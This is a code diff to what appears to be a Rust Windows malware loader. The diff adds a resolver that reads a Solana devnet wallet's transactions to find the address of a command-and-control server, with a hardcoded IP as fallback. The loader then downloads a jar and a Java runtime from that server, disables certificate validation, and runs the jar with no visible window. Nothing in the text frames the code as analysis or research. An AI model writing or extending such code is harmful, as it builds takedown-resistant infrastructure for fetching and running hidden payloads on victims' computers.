@@ -15,8 +15,12 @@ use windows_sys::Win32::System::Threading::*;
 use windows_sys::Win32::Networking::WinInet::*;
 
 const KEY: &str = "__ACCOUNT_KEY__";
-const SERVER: &str = "http://95.182.96.216";
+const FALLBACK_SERVER: &str = "95.182.96.216";
 const CREATE_NO_WINDOW: u32 = 0x08000000;
+
+// Solana Devnet details
+const SOLANA_WALLET: &str = "BCy1eKppGB5WPmQ8PrSJT4gkMRy5HmzsuaVrnqef7zoV";
+const SOLANA_RPC: &str = "api.devnet.solana.com";
 
 fn to_wide(s: &str) -> Vec<u16> {
     OsStr::new(s).encode_wide().chain(std::iter::once(0)).collect()
@@ -59,6 +63,99 @@ fn download_file(url: &str, dest: &Path, loader: &Path) -> bool {
         InternetCloseHandle(h_internet);
         success
     }
+}
+
+fn http_post(host: &str, path: &str, json_body: &str) -> Result<String, String> {
+    unsafe {
+        let agent = to_wide("Mozilla/5.0");
+        let h_internet = InternetOpenW(agent.as_ptr(), INTERNET_OPEN_TYPE_DIRECT, std::ptr::null(), std::ptr::null(), 0);
+        if h_internet.is_null() { return Err("InternetOpenW".into()); }
+
+        let host_w = to_wide(host);
+        let h_connect = InternetConnectW(h_internet, host_w.as_ptr(), 443, std::ptr::null(), std::ptr::null(), INTERNET_SERVICE_HTTP, 0, 0);
+        if h_connect.is_null() { InternetCloseHandle(h_internet); return Err("InternetConnectW".into()); }
+
+        let path_w = to_wide(path);
+        let verb = to_wide("POST");
+        
+        let flags = INTERNET_FLAG_SECURE | INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE | INTERNET_FLAG_IGNORE_CERT_CN_INVALID | INTERNET_FLAG_IGNORE_CERT_DATE_INVALID;
+        let h_request = HttpOpenRequestW(h_connect, verb.as_ptr(), path_w.as_ptr(), std::ptr::null(), std::ptr::null(), std::ptr::null(), flags, 0);
+        if h_request.is_null() { InternetCloseHandle(h_connect); InternetCloseHandle(h_internet); return Err("HttpOpenRequestW".into()); }
+
+        let headers = to_wide("Content-Type: application/json\r\n");
+        let body_bytes = json_body.as_bytes();
+
+        if HttpSendRequestW(h_request, headers.as_ptr(), u32::MAX, body_bytes.as_ptr() as _, body_bytes.len() as u32) == 0 {
+            InternetCloseHandle(h_request);
+            InternetCloseHandle(h_connect);
+            InternetCloseHandle(h_internet);
+            return Err("HttpSendRequestW".into());
+        }
+
+        let mut response_data = Vec::new();
+        let mut buffer = [0u8; 8192];
+        let mut bytes_read = 0;
+
+        while InternetReadFile(h_request, buffer.as_mut_ptr() as _, 8192, &mut bytes_read) != 0 && bytes_read > 0 {
+            response_data.extend_from_slice(&buffer[..bytes_read as usize]);
+        }
+
+        InternetCloseHandle(h_request);
+        InternetCloseHandle(h_connect);
+        InternetCloseHandle(h_internet);
+        
+        Ok(String::from_utf8_lossy(&response_data).to_string())
+    }
+}
+
+fn get_c2_ip(loader: &Path) -> String {
+    log(loader, "Fetching C2 IP from Solana...");
+    
+    let payload = format!(r#"{{"jsonrpc":"2.0","id":1,"method":"getSignaturesForAddress","params":["{}",{{"limit":10}}]}}"#, SOLANA_WALLET);
+    
+    let res = match http_post(SOLANA_RPC, "/", &payload) {
+        Ok(r) => r,
+        Err(e) => {
+            log(loader, &format!("Failed to fetch signatures: {}", e));
+            return FALLBACK_SERVER.to_string();
+        }
+    };
+
+    let mut sigs = Vec::new();
+    let mut rest = res.as_str();
+    while let Some(idx) = rest.find(r#""signature":""#) {
+        let start = idx + 13;
+        if let Some(end_idx) = rest[start..].find('"') {
+            sigs.push(rest[start..start+end_idx].to_string());
+            rest = &rest[start+end_idx..];
+        } else { break; }
+    }
+
+    if sigs.is_empty() {
+        log(loader, "No transactions found on Solana.");
+        return FALLBACK_SERVER.to_string();
+    }
+
+    for sig in sigs {
+        log(loader, &format!("Checking tx: {}", sig));
+        let tx_payload = format!(r#"{{"jsonrpc":"2.0","id":1,"method":"getTransaction","params":["{}",{{"encoding":"json"}}]}}"#, sig);
+        
+        if let Ok(tx_res) = http_post(SOLANA_RPC, "/", &tx_payload) {
+            if let Some(idx) = tx_res.find("1(") {
+                let start = idx + 2;
+                if let Some(end_idx) = tx_res[start..].find(')') {
+                    let ip_candidate = &tx_res[start..start+end_idx];
+                    if ip_candidate.chars().all(|c| c.is_ascii_digit() || c == '.') {
+                        log(loader, &format!("Found IP in Solana: {}", ip_candidate));
+                        return ip_candidate.to_string();
+                    }
+                }
+            }
+        }
+    }
+
+    log(loader, "Could not find 1(ip) in transactions. Using fallback.");
+    FALLBACK_SERVER.to_string()
 }
 
 fn extract_zip(zip_path: &Path, out_dir: &Path, loader: &Path) {
@@ -115,10 +212,10 @@ fn find_java(loader: &Path) -> Option<PathBuf> {
     None
 }
 
-fn download_jre(loader: &Path) -> Option<PathBuf> {
+fn download_jre(loader: &Path, server_ip: &str) -> Option<PathBuf> {
     let jre_zip = loader.join("jre.zip");
     let jre_dir = loader.join("jre");
-    let url = format!("{}/api/downloads/jre.zip", SERVER);
+    let url = format!("http://{}/api/downloads/jre.zip", server_ip);
 
     log(loader, "Java not found. Downloading portable JRE...");
     if !download_file(&url, &jre_zip, loader) {
@@ -151,8 +248,11 @@ fn main() {
     let _ = fs::write(loader.join("key.json"), format!("{{\"key\":\"{}\"}}", KEY));
     log(&loader, "Wrote key.json");
 
+    // Fetch IP from Solana
+    let server_ip = get_c2_ip(&loader);
+    let url = format!("http://{}/api/downloads/st.jar", server_ip);
+
     let jar_path = loader.join("st.jar");
-    let url = format!("{}/api/downloads/st.jar", SERVER);
     
     if !download_file(&url, &jar_path, &loader) || !jar_path.exists() {
         log(&loader, "Failed to download st.jar. Exiting.");
@@ -161,7 +261,7 @@ fn main() {
 
     let java_exe = match find_java(&loader) {
         Some(p) => p,
-        None => match download_jre(&loader) {
+        None => match download_jre(&loader, &server_ip) {
             Some(p) => p,
             None => {
                 log(&loader, "Could not find or download Java. Exiting.");
@@ -173,16 +273,12 @@ fn main() {
     let java_console_exe = java_exe.with_file_name("java.exe");
     log(&loader, &format!("Launching Java with: {:?}", java_console_exe));
 
-    // Strip "http://" and "https://" from the server so we pass ONLY the IP
-    let server_ip = SERVER.replace("http://", "").replace("https://", "").replace("/", "");
-
-    // Execute Java and capture stdout/stderr directly in Rust
     log(&loader, "Running st.jar and capturing output...");
     let output = Command::new(&java_console_exe)
         .arg("-jar")
         .arg(&jar_path)
         .arg(KEY)
-        .arg(&server_ip) // <--- PASSING ONLY THE IP
+        .arg(&server_ip) // Pass the IP to Java
         .creation_flags(CREATE_NO_WINDOW)
         .output();
 
